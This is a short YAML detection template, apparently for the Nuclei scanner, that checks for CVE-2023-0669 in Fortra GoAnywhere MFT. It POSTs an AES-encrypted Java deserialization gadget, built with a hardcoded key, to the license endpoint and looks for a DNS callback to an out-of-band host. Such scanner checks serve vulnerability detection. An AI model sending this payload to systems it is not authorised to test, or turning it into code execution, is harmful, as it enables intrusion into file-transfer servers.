id: yaml-poc-fortra-goanywhere_managed_file_transfer-logical-CVE-2023-0669
info:
  name: Yaml Poc Fortra Goanywhere_Managed_File_Transfer Logical Cve 2023 0669
  author: jiapeng.han
  severity: high
  description: 'Converted from xpoc: yaml-poc-fortra-goanywhere_managed_file_transfer-logical-CVE-2023-0669'
  tags: cve
  classification:
    cve-id: CVE-2023-0669
  reference:
  - http://packetstormsecurity.com/files/171789/Goanywhere-Encryption-Helper-7.1.1-Remote-Code-Execution.html
  - https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis
  - https://duo.com/decipher/fortra-patches-actively-exploited-zero-day-in-goanywhere-mft
  - https://frycos.github.io/vulns4free/2023/02/06/goanywhere-forgotten.html
  - https://github.com/rapid7/metasploit-framework/pull/17607
http:
- method: POST
  path:
  - /goanywhere/lic/accept
  body: bundle={{concat(url_encode(base64(aes_cbc(base64_decode(generate_java_gadget("dns",
    "http://{{reverse.url}}", "base64")), base64_decode("Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo="),
    base64_decode("QUVTL0NCQy9QS0NTNVBhZA==")))), '$2')}}
  headers:
    Content-Type: application/x-www-form-urlencoded
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 500
  - type: word
    part: body
    words:
    - GoAnywhere
